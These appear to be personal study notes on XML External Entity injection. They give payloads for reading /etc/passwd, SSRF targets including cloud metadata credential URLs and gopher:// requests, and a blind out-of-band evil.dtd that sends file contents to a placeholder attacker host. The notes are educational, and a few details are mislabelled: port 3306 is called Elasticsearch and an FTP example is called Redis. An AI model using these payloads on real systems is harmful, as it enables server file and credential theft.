# XML External Entity Injection (aka XXE)

# Impact
- File Disclosure (File Reading)
- SSRF attacks 
- blind XXE - exfiltrating data (from server directly to the attacker)
- Data transmission via error messages


### Core
**XML** - Extensive Markup Language - initially designed for transmitting and storing data. Doesn't use predefined tags, so (custom)  tags could have name of the data inside, in addition to storing it.

**XML External Entity** Injection - attacker can interfere  with the processing (parsing) of XML, consequently interacting with application's backend or external systems


![[Pasted image 20260726180217.png]]

**ENTITY** - used for describing  and representing data 
```XML
<!DOCTYPE rootelement [ <!ENTITY test "try to kill me" > ]>
```
**Document Type Definition** - **DTD** - declarations that can define the structure of an XML document.   DTD is defined within "**DOCTYPE**" and could be internal (in document) or external (from system or from other domain).

 **XML External Entity** - specified   using **SYSTEM**, using `file` protocol or http(s) 

```XML
<!DOCTYPE file [<!ENTITY external SYSTEM "file:///path/to/file > ]>

<!DOCTYPE domain [<!ENTITY external SYSTEM http://web-server.com" > ]>
```

---

# Exploiting XXE
### Arbitrary file reading
1. Make custom ENTITY inside DOCTYPE with the payload
2. Insert  its name inside root element

``` xml
--- PAYLOAD ---
<!DOCTYPE xxepayload [ <!ENTITY vuln SYSTEM "file:///etc/passwd"> ]>

---- IN XML DOCUMENT ----
<?xml version="1.0"? encoding="UTF-8"?>
<!DOCTYPE xxepayload 
[ <!ENTITY vuln SYSTEM "file:///etc/passwd"> 
]>

<xxepayload>
	<fileid> &vuln; </fileid>
</xxepayload>
```

![[Pasted image 20260726184108.png]]

### Server-Side Request Forgery (SSRF)
Server-Side Request Forgery - attacker crafts **GET request** where **trigger the endpoint (e.x) with sensitive information.** Main Trick: basically, we can't access internal endpoints, BUT! Server can, so we ask him for doing it using SSRF.
![[Pasted image 20260726193126.png]]

```xml
<!DOCTYPE ssrf <!ENTITY ssrfvuln "http://<SERVER'S IP or DOMAIN>/path/to/endpoint"> ]>
```
#### Juicy Endpoints
##### Localhost / Internal services  ( mysql / redis / admin panels.. etc) or communicate with them using `gopher` 
```http
http://127.0.0.1/
http://127.0.0.1:8080/  → admin panels, internal dashboards
http://127.0.0.1:6379/  → Redis (often no auth by default)
http://127.0.0.1:3306/  → Elasticsearch
http://localhost/admin
```
Core: SSRF usually only triggers, so in this case it just can validate service existence, however, most internal-only services doesn't have passwords at all. So, it can be accessible! (Reddis)

Byte-level control use the `gopher://` scheme, if the app's HTTP client supports it (`curl` does, by default, unless disabled).

`gopher://` can specify **arbitrary raw bytes** to send to a TCP port:

FTP access via gopher:
```http
gopher://internal-ftp:21/_USER%20anonymous%0d%0aPASS%20x%0d%0aLIST%0d%0a
```
That **URL-encoded** gibberish after `_` is literally the raw Redis wire protocol, byte for byte — same as if you'd typed commands into `redis-cli`. 

##### AWS EC2
```HTTP
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
http://169.254.169.254/latest/user-data/
```
##### Google Cloud (GCP)
```http
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
```
Requires header `Metadata-Flavor: Google` on GCP

##### Azure
```bash
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```
Requires header `Metadata: true`.

---
# Blind XXE
**"Blind XXE"** means communication between our own web-server and victim's one by hosting evil.dtd file. Examples shown above may not work due to many servers just won't send you their data in response. 

#### Out-of-Band XXE
```xml
--- Local Machine ---
php -S IP:PORT (or other server)

--- XML Payload ---
<!DOCTYPE check [ <!ENTITY validation SYSTEM "http://YOUR_DOMAIN:PORT"> ]>

*include entity "validation" in payload root-element*
```
This will just performs checks. If you see any requests = sever is vulnerable

or using parameter entities  (against filtering)

```xml
<!DOCTYPE check [ <!ENTITY % validation SYSTEM "http://YOUR_DOMAIN:PORT"> %validation; ]>
```

---
#### Data Exfiltration 
##### Out-of-Band
```xml
--- Local Machine ---
evil.dtd:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ATTACKER'sIP:PORT/?x=%file;'>">
%eval; 
%exfiltrate;

php -S IP:PORT (or other server)

--- XML Payload ---
<!DOCTYPE dtd [ <!ENTITY % xxe SYSTEM "http://YOUR_DOMAIN:PORT/evil.dtd"> %xxe; ]>
```

&#x25; - % in hex (used for avoid parser errors)
```txt
Step 1: Target parses evil.dtd
Step 2: %file — target reads its own /etc/passwd, stores it silently in memory
Step 3: %eval — target builds a brand-new entity definition (as text), which says:
        "define an entity called 'exfiltrate' whose SYSTEM URL is 
         http://attacker/?x=<the passwd content from step 2>"
        (this definition is now written into the DTD, but STILL not triggered yet)
Step 4: %exfiltrate — NOW the target actually triggers that newly-created entity,
        which means: make an HTTP request to http://attacker/?x=<passwd content>
Step 5: That HTTP request leaves the target machine and lands on YOUR server,
        with the stolen file content sitting in the URL query string
```
If we are able to use `php`, we can export large files (like /etc/passwd), cuz we can avoid special characters parsing errors using base64

```xml
<!ENTITY % file SYSTEM 'php://filter/convert.base64-encode/resource=file:///etc/passwd'>
```
 Otherwise, we can trigger only minor files like hostname


Step 1: We create malicious dtd file, which contains entity %file (/etc/hostname) and entity which  refers to our host (? - starts the query x= a query parameter (x could be replaced with other naming))
![[Pasted image 20260727002622.png]]

Step 2: We Insert payload, which will refer to our local hosted dtd file
![[Pasted image 20260727002636.png]]

Step 3: We access information
![[Pasted image 20260727002602.png]]

##### via error message
We try to call any nonexistent file, before specifying %file entity, containing information. SAME MECHANISM. (almost)

In plain English: give me content of nonexistent and after information from your memory about %file
![[Pasted image 20260727000839.png]]

![[Pasted image 20260727000814.png]]

```txt
display  →  "go download this file"           (happens in the payload)
file     →  "read this local file"             (happens inside the downloaded DTD)
eval     →  "construct a new instruction"       (happens inside the downloaded DTD)
exfill   →  "run that new instruction"          (happens inside the downloaded DTD)
```

---
# To be Continued....
https://portswigger.net/web-security/xxe/blind
